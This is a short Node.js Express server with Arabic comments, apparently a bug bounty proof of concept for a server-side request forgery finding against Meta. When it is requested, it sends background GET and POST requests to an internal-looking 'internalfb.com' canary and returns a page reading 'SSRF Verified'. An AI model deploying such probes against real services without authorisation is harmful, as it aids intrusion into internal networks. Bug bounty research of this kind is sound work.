const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', async (req, res) => {
    const canaryUrl = 'https://internalfb.com';
    try {
        // إرسال طلبات الخلفية للكناري لضمان تسجيل المحاولة
        axios.get(canaryUrl, { timeout: 3000 }).catch(() => {});
        axios.post(canaryUrl, {}, { timeout: 3000 }).catch(() => {});
        
        // إرجاع استجابة ناجحة لفيسبوك لتأكيد رمز 200
        res.status(200).send('<html><head><title>Meta Bug Bounty PoC</title></head><body><h1>SSRF Verified</h1></body></html>');
    } catch (error) {
        res.status(200).send('Success');
    }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
